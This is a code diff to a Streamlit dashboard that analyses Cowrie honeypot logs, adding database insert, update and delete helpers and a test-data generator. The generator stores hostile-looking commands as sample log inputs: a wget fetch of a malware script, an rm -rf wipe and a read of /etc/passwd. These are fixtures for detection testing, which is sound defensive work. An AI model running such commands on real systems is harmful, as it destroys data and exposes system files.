@@ -87,7 +87,7 @@ def get_connection():
         st.error(f"❌ Database connection failed: {str(e)}")
         return None
 
-def execute_query(query):
+def execute_query(query, params=None):
     """Execute SQL query with connection handling"""
     conn = None
     try:
@@ -96,9 +96,10 @@ def execute_query(query):
             return None
             
         with conn.cursor() as cur:
-            cur.execute(query)
+            cur.execute(query, params or ())
             if cur.description:  # If query returns results
                 return cur.fetchall()
+            conn.commit()
             return True
     except Exception as e:
         st.error(f"❌ Query failed: {str(e)}")
@@ -132,6 +133,40 @@ def load_data():
     df['attack_details'] = [x[1] for x in attack_info]
     
     return df
+
+def insert_row(data):
+    """Insert new log entry"""
+    query = """
+        INSERT INTO hornet7_data 
+        (timestamp, src_ip, eventid, input, message, session, dst_port)
+        VALUES (%s, %s, %s, %s, %s, %s, %s)
+    """
+    params = (
+        data.get('timestamp'),
+        data.get('src_ip'),
+        data.get('eventid'),
+        data.get('input'),
+        data.get('message'),
+        data.get('session'),
+        data.get('dst_port')
+    )
+    return execute_query(query, params)
+
+def update_row(session_id, updates):
+    """Update existing log entry"""
+    set_clause = ", ".join([f"{k} = %s" for k in updates.keys()])
+    query = f"""
+        UPDATE hornet7_data 
+        SET {set_clause}
+        WHERE session = %s
+    """
+    params = list(updates.values()) + [session_id]
+    return execute_query(query, params)
+
+def delete_row(session_id):
+    """Delete log entry"""
+    query = "DELETE FROM hornet7_data WHERE session = %s"
+    return execute_query(query, (session_id,))
 
 # --- Attack Detection ---
 def detect_attack_type(row):
@@ -167,69 +202,7 @@ def detect_attack_type(row):
         return "Port Scanning / Connection Attempt", f"Connection to port {row.get('dst_port')}"
     
     return "Unknown Activity", message[:100]
-# --- Data Manipulation Section ---
-st.header("📝 Data Management")
 
-# Auto-insert in sidebar
-st.sidebar.header("🧪 Test Data Generator")
-attack_type = st.sidebar.selectbox(
-    "Select attack type:",
-    ["Brute Force", "Malware Download", "Wiper Attack", "Reconnaissance", "Port Scan"]
-)
-
-if st.sidebar.button("🚀 Auto Insert"):
-    test_data = {
-        "timestamp": datetime.now().isoformat(),
-        "src_ip": f"10.0.{random.randint(1,255)}.{random.randint(1,255)}",
-        "session": f"TEST-{random.randint(1000,9999)}",
-        "attack_type": attack_type,
-        "dst_port": str(random.choice([22, 80, 443, 8080]))
-    }
-    
-    # Attack-specific fields
-    if attack_type == "Brute Force":
-        test_data.update({
-            "eventid": "cowrie.login.failed",
-            "attempt_count": random.randint(5,20)
-        })
-    elif attack_type == "Port Scan":
-        test_data.update({
-            "eventid": "cowrie.session.connect",
-            "message": f"Scan detected on port {test_data['dst_port']}"
-        })
-    # Add other attack types...
-    
-    insert_row(test_data)
-    st.sidebar.success(f"Inserted {attack_type} test case!")
-    st.rerun()
-
-# Manual controls in main panel
-with st.expander("🛠️ Manual Data Controls"):
-    col1, col2 = st.columns(2)
-    
-    with col1:
-        st.subheader("➕ Insert New")
-        new_data = {
-            "timestamp": st.text_input("Timestamp", datetime.now().isoformat()),
-            "src_ip": st.text_input("Source IP", "192.168.1.1"),
-            "eventid": st.selectbox("Event Type", ["login.failed", "command.input", "session.connect"])
-        }
-        if st.button("Insert"):
-            insert_row(new_data)
-            st.success("Inserted!")
-    
-    with col2:
-        st.subheader("✏️ Update Existing")
-        session_id = st.text_input("Session ID to update")
-        if st.button("Update"):
-            update_row(session_id, {"status": "investigating"})
-            st.success("Updated!")
-        
-        st.subheader("❌ Delete Record")
-        del_id = st.text_input("Session ID to delete")
-        if st.button("Delete"):
-            delete_row(del_id)
-            st.success("Deleted!")
 # --- Visualization ---
 def build_session_graph(row):
     """Create network graph for a session"""
@@ -280,7 +253,7 @@ def build_session_graph(row):
     
     return G
 
-# --- Dashboard Layout ---
+# --- Main Dashboard ---
 def main():
     st.set_page_config(
         page_title="GraphPot - Network Session Analysis", 
@@ -293,6 +266,54 @@ def main():
         st.rerun()
 
     st.markdown("---")
+
+    # --- Auto Test Data Generator ---
+    st.sidebar.header("🧪 Test Data Generator")
+    attack_type = st.sidebar.selectbox(
+        "Select attack type:",
+        ["Brute Force", "Malware Download", "Wiper Attack", "Reconnaissance", "Port Scan"]
+    )
+    
+    if st.sidebar.button("🚀 Auto Insert Test Data"):
+        test_data = {
+            "timestamp": datetime.now().isoformat(),
+            "src_ip": f"10.0.{random.randint(1,255)}.{random.randint(1,255)}",
+            "session": f"TEST-{random.randint(1000,9999)}",
+            "dst_port": str(random.choice([22, 80, 443, 8080]))
+        }
+        
+        if attack_type == "Brute Force":
+            test_data.update({
+                "eventid": "cowrie.login.failed",
+                "attempt_count": random.randint(5,20),
+                "message": "Failed login attempt"
+            })
+        elif attack_type == "Malware Download":
+            test_data.update({
+                "eventid": "cowrie.command.input",
+                "input": "wget http://test.com/malware.sh"
+            })
+        elif attack_type == "Wiper Attack":
+            test_data.update({
+                "eventid": "cowrie.command.input",
+                "input": "rm -rf /important/files"
+            })
+        elif attack_type == "Reconnaissance":
+            test_data.update({
+                "eventid": "cowrie.command.input",
+                "input": "cat /etc/passwd"
+            })
+        elif attack_type == "Port Scan":
+            test_data.update({
+                "eventid": "cowrie.session.connect",
+                "message": f"Port scan detected on {test_data['dst_port']}"
+            })
+        
+        if insert_row(test_data):
+            st.sidebar.success(f"Inserted {attack_type} test data!")
+            st.rerun()
+        else:
+            st.sidebar.error("Failed to insert test data")
 
     # Load data with progress indicator
     with st.spinner('Loading threat data...'):
@@ -324,6 +345,62 @@ def main():
             f'<marquee style="font-size: 18px; color: black; background-color: white; padding: 10px;">{moving_text}</marquee>',
             unsafe_allow_html=True
         )
+
+        st.markdown("---")
+
+        # --- Data Management Section ---
+        with st.expander("🛠️ Data Management Controls", expanded=False):
+            col1, col2 = st.columns(2)
+            
+            with col1:
+                st.subheader("➕ Insert New Entry")
+                with st.form("insert_form"):
+                    new_data = {
+                        "timestamp": st.text_input("Timestamp", datetime.now().isoformat()),
+                        "src_ip": st.text_input("Source IP", "192.168.1.1"),
+                        "eventid": st.selectbox("Event Type", [
+                            "cowrie.login.failed", 
+                            "cowrie.login.success",
+                            "cowrie.command.input",
+                            "cowrie.session.connect"
+                        ]),
+                        "input": st.text_input("Command Input (if applicable)"),
+                        "message": st.text_area("Log Message"),
+                        "session": st.text_input("Session ID", f"MANUAL-{random.randint(1000,9999)}"),
+                        "dst_port": st.text_input("Destination Port")
+                    }
+                    if st.form_submit_button("Insert"):
+                        if insert_row(new_data):
+                            st.success("Entry inserted successfully!")
+                            st.rerun()
+                        else:
+                            st.error("Failed to insert entry")
+            
+            with col2:
+                st.subheader("✏️ Update Entry")
+                with st.form("update_form"):
+                    session_id = st.text_input("Session ID to update")
+                    new_status = st.selectbox("Update Status", [
+                        "investigating", 
+                        "resolved", 
+                        "false_positive"
+                    ])
+                    if st.form_submit_button("Update"):
+                        if update_row(session_id, {"status": new_status}):
+                            st.success("Entry updated successfully!")
+                            st.rerun()
+                        else:
+                            st.error("Failed to update entry")
+                
+                st.subheader("❌ Delete Entry")
+                with st.form("delete_form"):
+                    del_id = st.text_input("Session ID to delete")
+                    if st.form_submit_button("Delete"):
+                        if delete_row(del_id):
+                            st.success("Entry deleted successfully!")
+                            st.rerun()
+                        else:
+                            st.error("Failed to delete entry")
 
         st.markdown("---")
 
